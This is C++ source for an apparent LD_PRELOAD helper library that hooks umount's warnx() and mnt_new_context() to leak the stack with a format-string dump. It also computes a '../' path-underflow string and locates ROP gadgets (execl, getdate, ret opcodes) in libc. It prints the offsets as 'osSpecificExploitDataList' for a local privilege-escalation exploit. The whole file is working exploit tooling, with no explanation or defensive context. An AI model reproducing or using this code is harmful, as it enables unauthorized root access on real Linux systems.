#include <ctime>
#include <cerrno>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdarg>
#include <cassert>

#include <vector>
#include <string>
#include <fstream>
#include <iostream>

#include <err.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/poll.h>
#include <linux/limits.h>

static int g_FormatSize;
static bool g_TraceDebug;

#ifdef __x86_64__
const char *g_FormatSpec = "%016lx";
#elif __i386__
const char *g_FormatSpec = "%08x";
#endif

extern "C" {
struct libmnt_context;
struct libmnt_context *mnt_new_context(void);
void warnx(const char *__format, ...);
}

static struct addrSym {

  void *libmnt_ctx;
  void *argv;
  void *argv0;

#ifdef __x86_64__

  void *rop_getdate;

#elif __i386__

  /* not used */
  // void *env0;
  void *rop_opcode_ret;

#endif

  void *rop_execl;
} g_addrSym = {};

struct osSpecDataList {

  std::string os_release_ver;
  std::string underflow_to_strdir;
  std::string strdir;

  size_t libmnt_ctx;
  size_t argv;
  size_t argv0;

#ifdef __x86_64__

  size_t rop_getdate;

#elif __i386__

  const int args_to_env0 = 22;
  size_t env0;
  size_t rop_opcode_ret;

#endif

  size_t rop_execl;
};

struct pipe_settings {
  int fd[2];
  int stdout_old, stderr_old;
};

typedef struct maps {
  unsigned long soff, eoff;
  char perms[4 + 1];
  unsigned long long pgoff;
  dev_t major, minor;
  unsigned long inode;
  char path[PATH_MAX];
} maps_t;

static bool
proc_maps_find(pid_t pid, const std::string &regex_pattern, std::vector<maps_t> &pm_list)
{
  maps_t pm;
  std::string line;
  std::ifstream ifs;

  ifs.open("/proc/" + std::to_string(pid) + "/maps");

  if (!ifs.is_open()) {
    printf("[-] Cannot open: /proc/%d/maps - %s\n", pid, strerror(errno));
    return false;
  }

  while (getline(ifs, line)) {

    if (line.find(regex_pattern) != std::string::npos) {

      sscanf(line.c_str(),
             "%lx-%lx %4s %llx %lx:%lx %lx %4096[^\n]",
             &pm.soff,
             &pm.eoff,
             pm.perms,
             &pm.pgoff,
             &pm.major,
             &pm.minor,
             &pm.inode,
             pm.path);

      pm_list.push_back(pm);
    }
  }

  return true;
}

static char *find_strdir_in_libc(const char *orig_sym, int &last_byte_to_strdir)
{
  int len_dir;
  char *strdir, *valid_stack_strdir;

  assert(orig_sym != nullptr);

  strdir  = (char *)((size_t)orig_sym & ~(0xFF));
  len_dir = strlen(strdir);

  valid_stack_strdir = nullptr;

  if ((len_dir > 0 && len_dir <= NAME_MAX) && strdir[0] != '/') {

    valid_stack_strdir  = strdir;
    last_byte_to_strdir = '\0';

    printf("[+] Found last byte to off_dir == \"\\x%1$02x\" = \"%2$p\" = \"%2$s\"\n",
           last_byte_to_strdir,
           valid_stack_strdir);

  } else {

    strdir = (char *)((size_t)orig_sym & ~(0xFFFF));

    for (int last_byte = 1; last_byte <= 0xFF; last_byte++) {

      ++strdir;
      len_dir = strlen(strdir);

      if ((len_dir > 0 && len_dir <= NAME_MAX) && strdir[0] != '/') {

        // if (!isgraph(last_byte)) { // if need printable symlink
        //   continue;
        // }

        printf("[+] Found last byte to off_dir == \"\\x%1$02x\" = \"%2$p\" = \"%2$s\"\n",
               last_byte,
               strdir);

        valid_stack_strdir  = strdir;
        last_byte_to_strdir = last_byte;
        break;
      }
    }
  }

  return valid_stack_strdir;
}

static bool
calculate_underflow_path(struct osSpecDataList &edata, void *heap_beg, void *heap_end)
{
  const char *dl_err;
  const char *sym;

  int last_byte;
  int underflow_ln;
  char *valid_stack_strdir;
  char *pos_sym, *pos_slash;

  assert(heap_beg != nullptr && heap_end != nullptr);

  sym = (decltype(sym))dlsym(RTLD_NEXT, "_nl_default_dirname");

  if ((dl_err = dlerror()) != nullptr) {
    printf("[-] dlsym() - %s\n", dl_err);
    return false;
  }

  pos_sym = (char *)memmem(heap_beg, sym - (char *)heap_beg, &sym, sizeof(decltype(sym)));

  if (!pos_sym) {
    printf("[-] Found \"_nl_default_dirname\" in %p\n", pos_sym);
    return false;
  }

  printf("[+] Found \"_nl_default_dirname\" in %p\n", pos_sym);

  if (pos_sym - PATH_MAX < heap_beg) {
    printf("[-] Memory out\n");
    return false;
  }

  pos_slash = (char *)memrchr(pos_sym - PATH_MAX, '/', PATH_MAX);

  if (!pos_slash) {
    printf("[-] Does not found slash\n");
    return false;
  }

  underflow_ln = pos_sym - pos_slash;
  underflow_ln--;

  valid_stack_strdir = find_strdir_in_libc(sym, last_byte);

  if (!valid_stack_strdir) {
    printf("[-] Cannot find strdir in heap\n");
    return false;
  }

  edata.strdir.assign(valid_stack_strdir);

  edata.underflow_to_strdir.append("../x/../../");
  edata.underflow_to_strdir.append(underflow_ln, 'A');

  if (last_byte != '\0') {
    underflow_ln++;
    edata.underflow_to_strdir.push_back(last_byte); // to strdir;
  }

  printf("[+] Calculate \"underflow\" path [ strip => %s ] - size:%d\n",
         pos_slash,
         underflow_ln);

  if (edata.underflow_to_strdir.size() >= PATH_MAX) {
    printf("[-] underflow_to_strdir.size() >= PATH_MAX\n");
    return false;
  }

  return true;
}

static bool read_dumped_stack(std::string &pipe_buf, std::vector<size_t> &stack_buf)
{
  char *tok;
  size_t pos_read, i;

  pos_read = pipe_buf.find("umount: ");

  if (pos_read == std::string::npos) {
    pos_read = 0;
  }

  i = 0;
  for (tok = strtok(&pipe_buf.at(pos_read), "-"); tok && i < stack_buf.size();
       tok = strtok(nullptr, "-"), ++i) {

    sscanf(tok, g_FormatSpec, &stack_buf[i]);

    if (g_TraceDebug) {
      printf("\t [index stack = %ld] ", i);
      printf(g_FormatSpec, stack_buf[i]);
      printf("\n");
    }
  }

  return i ? true : false;
}

static bool set_ROP_chain(struct osSpecDataList &edata)
{
  const char *dl_err;

  pid_t pid = getpid();
  std::vector<maps_t> pm_libc;

  if (!proc_maps_find(pid, "libc-", pm_libc) || pm_libc.empty()) {
    printf("[-] Found \"libc-\" in \"/proc/%d/maps\"\n", pid);
    return false;
  }

  g_addrSym.rop_execl = dlsym(RTLD_NEXT, "execl");

  if ((dl_err = dlerror()) != nullptr) {
    printf("[-] dlsym() - %s\n", dl_err);
    return false;
  }

#ifdef __x86_64__

  g_addrSym.rop_getdate = dlsym(RTLD_NEXT, "getdate");

  if ((dl_err = dlerror()) != nullptr) {
    printf("[-] dlsym() - %s\n", dl_err);
    return false;
  }

#elif __i386__

  size_t libc_page_exec_eoff = 0;

  /* Find executable page */
  for (auto &pm : pm_libc) {
    if (pm.perms[2] == 'x') {
      libc_page_exec_eoff = pm.eoff;
    }
  }

  if (!libc_page_exec_eoff) {
    printf("[-] Cannot find end address libc.so\n");
    return false;
  }

  for (const std::string &x86_opcodes : {
           "\xc3",         // ret;
           "\x40\xc3",     // inc eax; ret;
           "\x48\xc3",     // dec eax; ret
           "\x31\xc0\xc3", // xor eax,eax; ret
       }) {

    void *p = memmem((void *)g_addrSym.rop_execl,
                     libc_page_exec_eoff - (size_t)g_addrSym.rop_execl,
                     x86_opcodes.data(),
                     x86_opcodes.size());

    if (p && !g_addrSym.rop_opcode_ret) {
      g_addrSym.rop_opcode_ret = p;
      break;
    }
  }

  if (!g_addrSym.rop_opcode_ret) {
    printf("[-] Cannot find opcode \"ret\"\n");
    return false;
  }

#endif

  /* not used */
  // g_addrSym.env0 = nullptr;

  return true;
}

static bool get_os_version(struct osSpecDataList &edata)
{
  std::ifstream ifs;
  std::string line, ver;

  ifs.open("/etc/os-release");

  if (!ifs.is_open()) {
    printf("[-] Cannot open \"/etc/os-release\" - %s\n", strerror(errno));
    return false;
  }

  while (getline(ifs, line)) {

    const char *key_os_rel = "VERSION=";

    if (line.find(key_os_rel) != std::string::npos) {

      ver = line.substr(strlen(key_os_rel));

      if (ver.front() == '"' && ver.back() == '"' && ver.size() > 1) {
        ver.erase(0, 1);
        ver.pop_back();
      }

      edata.os_release_ver = move(ver);
      return true;
    }
  }

  return false;
}

static void print_osSpecDataList(struct osSpecDataList &edata)
{
  if (!get_os_version(edata)) {
    printf("[-] Cannot get /etc/os-release\n");
  }

  printf("[*] osSpecificExploitDataList: \n");
  printf("\t\"\\\"%s\\\"\", /* VERSION in /etc/os-release */\n",
         edata.os_release_ver.c_str());

  printf("\t\"");
  for (unsigned char c : edata.underflow_to_strdir) {
    printf("\\x%02x", c);
  }
  printf("\", /* underflow to strdir */\n");

  printf("\t\"");
  for (unsigned char c : edata.strdir) {
    printf("\\x%02x", c);
  }
  printf("\", /* strdir */\n");

  printf("\t\"");

  for (const size_t &offto : {
           edata.libmnt_ctx,
           edata.argv,
           edata.argv0,
#ifdef __x86_64__
           edata.rop_getdate,
#elif __i386__
           edata.env0,
           edata.rop_opcode_ret,
#endif
           edata.rop_execl,
       }) {

    for (size_t i = 0; i < sizeof(int); i++) {
      printf("\\x%02x", ((unsigned char *)&offto)[i]);
    }
  }
  printf("\",\n");

  fflush(stdout);
}

static bool pipe_init(struct pipe_settings &psett)
{
  /* backup default stdout and stderr */
  psett.stdout_old = dup(STDOUT_FILENO);
  psett.stderr_old = dup(STDERR_FILENO);
  /* -------------------------------- */

  if (pipe(psett.fd) == -1) {
    printf("[-] pipe()\n");
    return false;
  }

  if (psett.fd[1] != STDOUT_FILENO) {
    dup2(psett.fd[1], STDOUT_FILENO);
    dup2(psett.fd[1], STDERR_FILENO);
  }

  return true;
}

static bool pipe_read(struct pipe_settings &psett, std::string &buf)
{
  char tbuf[1024];
  struct pollfd poll_data;

  poll_data.fd     = psett.fd[0];
  poll_data.events = POLLIN;

  for (bool pipe_avail = true; pipe_avail;) {

    switch (poll(&poll_data, 1, 10)) {
      case -1:
        return false;
      case 0:
        pipe_avail = false;
        break;
    }

    if (poll_data.revents & (POLLIN | POLLHUP)) {

      ssize_t n = read(poll_data.fd, tbuf, sizeof(tbuf));

      if (n <= 0) {
        break;
      }

      buf.append(tbuf, n);
    }
  }

  return true;
}

static void pipe_close(struct pipe_settings &psett)
{
  /* reset default stdout and stderr */
  dup2(psett.stdout_old, STDOUT_FILENO);
  close(psett.stdout_old);

  dup2(psett.stderr_old, STDERR_FILENO);
  close(psett.stderr_old);
  /* ------------------------------- */

  close(psett.fd[0]);
  close(psett.fd[1]);
}

static int parse_dumped_stack(const std::vector<size_t> &stack_buf,
                              struct osSpecDataList &edata)
{
  pid_t pid = getpid();
  std::vector<maps_t> pm_stack, pm_libc;

  size_t srcPtrLocation = 0, libcRetn = 0;

  size_t stack_page_rw_soff = 0, stack_page_rw_eoff = 0;
  size_t libc_page_exec_soff = 0, libc_page_exec_eoff = 0;

  if (!proc_maps_find(pid, "[stack]", pm_stack) || pm_stack.empty()) {
    printf("[-] Found \"[stack]\" in \"/proc/%d/maps\"\n", pid);
    return false;
  }

  if (!proc_maps_find(pid, "libc-", pm_libc) || pm_libc.empty()) {
    printf("[-] Found \"libc-\" in \"/proc/%d/maps\"\n", pid);
    return false;
  }

  /* Find executable page */
  for (auto &pm : pm_libc) {

    if (pm.perms[2] == 'x') {

      if (libc_page_exec_soff) {
        printf("[-] Multiple executable page in libc.so\n");
        return false;
      }

      libc_page_exec_soff = pm.soff;
      libc_page_exec_eoff = pm.eoff;
    }
  }

  if (!libc_page_exec_soff || !libc_page_exec_eoff) {
    printf("[-] Cannot find start-end address libc.so\n");
    return false;
  }

  stack_page_rw_soff = pm_stack.front().soff;
  stack_page_rw_eoff = pm_stack.back().eoff;

  for (size_t i = 0; i < stack_buf.size(); ++i) {

    size_t stack_val = stack_buf.at(i);

    /* --- Start search **argv and argv[0] --- */

    if (!g_addrSym.argv && i >= 2 /* skip overflow */) {

      /* Address **argv exists in range stack */
      if (stack_val > stack_page_rw_soff && stack_val < stack_page_rw_eoff) {

        /* Address return after main() exists in executable range libc.so */
        if (stack_buf.at(i - 2) > libc_page_exec_soff &&
            stack_buf.at(i - 2) < libc_page_exec_eoff) {

          char **argv = (char **)stack_val;

          /* Address argv[0] exists in range stack */
          if ((size_t)argv[0] > stack_page_rw_soff &&
              (size_t)argv[0] < stack_page_rw_eoff) {

            if (strstr(argv[0], "/umount")) {
              g_addrSym.argv  = argv;
              g_addrSym.argv0 = argv[0];
            }
          }
        }
      }
    }

    /* --- End search **argv and argv[0] --- */

    if (stack_val == (size_t)g_addrSym.libmnt_ctx) {

      if (g_addrSym.libmnt_ctx && !edata.libmnt_ctx)
        edata.libmnt_ctx = i + 1;
    }

    if (stack_val == (size_t)g_addrSym.argv) {

      if (g_addrSym.argv && !edata.argv)
        edata.argv = i;
    }

    if (stack_val == (size_t)g_addrSym.argv0) {

      if (g_addrSym.argv0 && !edata.argv0)
        edata.argv0 = i;
    }
  }

  if (!edata.libmnt_ctx || !edata.argv || !edata.argv0) {
    printf("[-] Try again. Does not found useable offsets\n");
    return false;
  }

#ifdef __x86_64__
  // target to &(argv)
  srcPtrLocation = stack_buf.at(edata.argv) - 0xD0;
  // to &(return after main)
  libcRetn = srcPtrLocation - 0x10;
#elif __i386__
  // target to &(argv)
  srcPtrLocation = stack_buf.at(edata.argv) - 0x90;
  // to &(return after main)
  libcRetn = srcPtrLocation - 0x8;
#endif

  if (*(size_t *)srcPtrLocation != stack_buf.at(edata.argv)) {
    printf("[-] %s does not found in stack\n", "void *sourcePointerLocation");
    return false;
  }

  libcRetn = *(size_t *)libcRetn;

  if ((libcRetn < libc_page_exec_soff || libcRetn > libc_page_exec_eoff) ||
      libcRetn != stack_buf.at(edata.argv - 2)) {
    printf("[-] %s does not found in stack\n",
           "void *libcStartFunctionReturnAddressSource");
    return false;
  }

  if (g_TraceDebug) {
    printf("[*] libc addr after main() = %#lx\n", libcRetn);
  }

  if (!set_ROP_chain(edata)) {
    printf("[-] Cannot get ROP chain\n");
    return false;
  }

  edata.rop_execl = (size_t)g_addrSym.rop_execl - libcRetn;

#ifdef __x86_64__

  edata.rop_getdate = (size_t)g_addrSym.rop_getdate - libcRetn;

#elif __i386__

  edata.env0           = edata.argv0 + edata.args_to_env0 + 1;
  edata.rop_opcode_ret = (size_t)g_addrSym.rop_opcode_ret - libcRetn;

#endif

  printf("[*] Offset list:\n");
  printf("\t[+] struct libmnt_context*  - %#lx\n", edata.libmnt_ctx);
  printf("\t[+] char **argv             - %#lx\n", edata.argv);
  printf("\t[+] char *argv[0]           - %#lx\n", edata.argv0);
#ifdef __x86_64__
  printf("\t[+] ROP getdate()           - %#lx\n", edata.rop_getdate);
#elif __i386__
  printf("\t[+] ROP opcode_ret          - %#lx\n", edata.rop_opcode_ret);
  printf("\t[+] char *env[0]            - %#lx\n", edata.env0);
#endif
  printf("\t[+] ROP execl()             - %#lx\n", edata.rop_execl);

  return true;
}

static void collect_data_for_exploit(std::string &pipe_buf)
{
  pid_t pid;
  void *heap_beg, *heap_end;
  std::vector<maps_t> pm_heap;

  std::vector<size_t> stack_buf;
  struct osSpecDataList edata = {};

  pid = getpid();

  if (!proc_maps_find(pid, "[heap]", pm_heap) || pm_heap.empty()) {
    printf("[-] Found \"[heap]\" in \"/proc/%d/maps\"", pid);
    return;
  }

  heap_beg = (void *)pm_heap.front().soff;
  heap_end = (void *)pm_heap.back().eoff;

  if (!calculate_underflow_path(edata, heap_beg, heap_end)) {
    printf("[-] calculate_underflow_path()\n");
    return;
  }

  stack_buf.resize(g_FormatSize);

  if (!read_dumped_stack(pipe_buf, stack_buf)) {
    printf("[-] read_dumped_stack()\n");
    return;
  }

  if (!parse_dumped_stack(stack_buf, edata)) {
    printf("[-] parse_dumped_stack()\n");
    return;
  }

  print_osSpecDataList(edata);
}

static void init_format(std::string &format_spec)
{
  for (int i = 0; i < g_FormatSize; ++i) {

    format_spec.append(g_FormatSpec);

    if (i + 1 != g_FormatSize) {
      format_spec.push_back('-');
    }
  }
}

void warnx(const char *__format, ...)
{
  const char *dl_err;
  decltype(&vwarnx) dl_call;

  std::string pipe_buf;
  struct pipe_settings psett = {};

  dl_call = (decltype(dl_call))dlsym(RTLD_NEXT, "vwarnx");

  if ((dl_err = dlerror()) != nullptr) {
    printf("[-] dlsym() - %s\n", dl_err);
    exit(EXIT_FAILURE);
  }

  if (g_TraceDebug) {
    printf("[*] TRACE: %s = %p\n", __FUNCTION__, dl_call);
  }

  std::string format_spec;
  init_format(format_spec);

  if (!pipe_init(psett)) {
    printf("[-] Pipe init\n");
    exit(EXIT_FAILURE);
  }

  /* original part */
  va_list list;
  va_start(list, __format);
  dl_call(format_spec.c_str(), list);
  va_end(list);
  /* ------------- */

  bool status_read = pipe_read(psett, pipe_buf);
  pipe_close(psett);

  if (!status_read || pipe_buf.empty()) {

    printf("[-] Cannot read pipe\n");
    if (errno) {
      printf(" - %s", strerror(errno));
    }
    puts("\n");
  }

  collect_data_for_exploit(pipe_buf);
}

struct libmnt_context *mnt_new_context(void)
{
  const char *dl_err;
  decltype(&mnt_new_context) dl_call;

  struct libmnt_context *ctx;

  dl_call = (decltype(dl_call))dlsym(RTLD_NEXT, "mnt_new_context");

  if ((dl_err = dlerror()) != nullptr) {
    printf("[-] dlsym() - %s\n", dl_err);
    exit(EXIT_FAILURE);
  }

  ctx = dl_call();

  if (g_TraceDebug) {
    printf("[*] TRACE: %s = %p\n", __FUNCTION__, dl_call);
    printf("[*] TRACE: %s = %p\n", "struct libmnt_context*", ctx);
  }

  g_addrSym.libmnt_ctx = ctx;

  return ctx;
}

__attribute__((constructor)) static void main_init()
{
  const char *opt_sz, *opt_debug;

  opt_sz    = getenv("STACK_SIZE");
  opt_debug = getenv("TRACE_DEBUG");

  g_FormatSize = opt_sz ? std::stoi(opt_sz, nullptr, 10) : 100;
  g_TraceDebug = opt_debug && std::stoi(opt_debug, nullptr, 10) == 1 ? true : false;

  extern char **environ;
  for (char **ep = environ; *ep; ++ep) {

    char *e = strchr(*ep, '=');

    if (e && strncmp(*ep, "LC_ALL", 6) != 0) {
      *e = '\0';
      unsetenv(*ep);
    }
  }

  constexpr bool replace_lc = true;
  setenv("LC_ALL", "C.UTF-8", replace_lc);
}
